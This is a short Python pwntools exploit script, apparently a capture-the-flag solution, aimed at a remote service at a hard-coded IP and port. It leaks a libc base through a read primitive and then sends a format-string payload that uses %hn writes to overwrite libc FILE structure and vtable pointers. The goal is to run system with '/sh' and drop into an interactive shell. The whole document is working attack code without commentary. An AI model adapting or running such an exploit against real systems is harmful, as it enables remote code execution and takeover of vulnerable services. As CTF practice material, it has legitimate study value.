from pwn import *

# 0x1b1ac0 -- _IO_file_jumps
# 0x1b2df4,0x1a9b54 -- *_IO_file_jumps
# 0x1b2ee4,0x1a9b60 -- maigc table
# 0x1b2d60,0x1a9ac0 -- _IO_2_1_stdout_
# 0x3ada0,0x3e3e0 -- system

#s = remote('192.168.0.85',1234)
s = remote('202.120.7.210', 12321)
s.recvuntil('read:')
s.send(str(0x8049FE4)+'\n')
libc = int(s.recvuntil('G')[-2-10:-2],16) - 0x311b0
log.info('LIBC : 0x%x'%libc)
hi = (libc+0x3e3e0)&0xffff
low = (libc+0x3e3e0)>>16
magic = (libc+0x1a9b60)&0xffff
offset = 0xffff-low
offset2 = 0xffff - 0x6873
raw_input()
dat = ''
dat += 'AAAA' # 7
dat += '/sh;' # 8
dat += '%'+str(hi-0x9)+'x' # 9
dat += 'A' # 10
dat += '%13$hn' # 11
dat += 'AA' # 12
dat += p32(libc+0x1a9b60) # 13

dat += '%'+str(low-hi-0x7)+'x' # 14
dat += 'A' # 15
dat += '%18$hn' # 16
dat += 'AA' # 17
dat += p32(libc+0x1a9b62) # 18 

dat +='%'+str(offset + 0x6873 - 0x6)+'x' # 19
dat += 'A' # 20
dat += '%23$hn' # 21
dat += 'AA' # 22
dat += p32(libc+0x1a9ac0)# 23

dat +='%'+str( offset2 + 0x3b00 - 0x6)+'x' # 24
dat += 'A' # 25
dat += '%28$hn' # 26
dat += 'AA' # 27
dat += p32(libc+0x1a9ac2)# 28

dat += '%'+str(magic-0x3b00-0x7-0x1c)+'x' # 29
dat += 'A' # 30
dat += '%33$hn' # 31
dat += 'AA' # 32
dat += p32(libc+0x1a9b54) # 33
print len(dat)
s.send(dat+'\n')
s.interactive()
